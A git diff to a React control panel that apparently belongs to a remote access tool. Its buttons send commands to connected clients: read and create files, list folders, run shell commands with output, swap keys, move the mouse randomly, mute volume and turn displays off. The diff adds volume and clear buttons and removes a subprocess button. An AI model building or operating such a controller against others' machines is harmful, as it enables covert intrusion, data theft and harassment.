@@ -93,7 +93,6 @@ export default function App() {
     }
 
     setLog(prev => [...prev, `Sent to ${selectedClient || "broadcast"}: ${command}`]);
-    setInputValue("");
   };
 
   return (
@@ -114,6 +113,9 @@ export default function App() {
         </select>
 
         <input value={inputValue} onChange={e => setInputValue(e.target.value)} placeholder="Type value..." />
+        <button style={{backgroundColor:"#8a5249ff",marginLeft:10}} onClick={() => {
+  setInputValue("")
+}}>Clear</button>
 
         <label className="custom-checkbox">
           <input type="checkbox" checked={heartEffect} onChange={e => setHeartEffect(e.target.checked)} />
@@ -155,6 +157,8 @@ export default function App() {
         <button style={{ backgroundColor: "#2f5ac8ff" }} onClick={() => sendCommand(`playtone ${inputValue}`, true)}>Play Tone</button>
         <button style={{ backgroundColor: "#6dca34ff" }} onClick={() => sendCommand("displayoff", false)}>Display Off</button>
         <button style={{ backgroundColor: "#9c15eaff" }} onClick={() => sendCommand("displayon", false)}>Display On</button>
+        <button style={{ backgroundColor: "#6dca34ff" }} onClick={() => sendCommand("mutevolume", false)}>Mute Volume</button>
+        <button style={{ backgroundColor: "#9c15eaff" }} onClick={() => sendCommand("fullvolume", false)}>Full Volume</button>
         <button style={{ backgroundColor: "#2f5ac8ff" }} onClick={() => sendCommand(`listfolder ${inputValue}`, true)}>List Folder</button>
         <button style={{ backgroundColor: "#2fc853ff" }} onClick={() => sendCommand(`createfile ${inputValue}`, true)}>Create File</button>
         <button style={{ backgroundColor: "#2f5ac8ff" }} onClick={() => sendCommand(`readfile ${inputValue}`, true)}>Read File</button>
@@ -183,7 +187,6 @@ export default function App() {
         <button style={{ backgroundColor: "#59a0b6ff" }} onClick={() => sendCommand(`stoprandommove`, false)}>Stop Random Mouse</button>
         <button style={{ backgroundColor: "#8e44ad" }} onClick={() => sendCommand(`swapkey ${inputValue}`, true)}>Swap Key</button>
         <button style={{ backgroundColor: "#9b59b6" }} onClick={() => sendCommand(`browser ${inputValue}`, true)}>Open Browser</button>
-        <button style={{ backgroundColor: "#34495e" }} onClick={() => sendCommand(`subprocess ${inputValue}`, true)}>Run Subprocess</button>
         <button style={{ backgroundColor: "#5e4c34ff" }} onClick={() => sendCommand(`cmdwithoutput ${inputValue}`, true)}>Output Subprocess</button>
       </div>
 
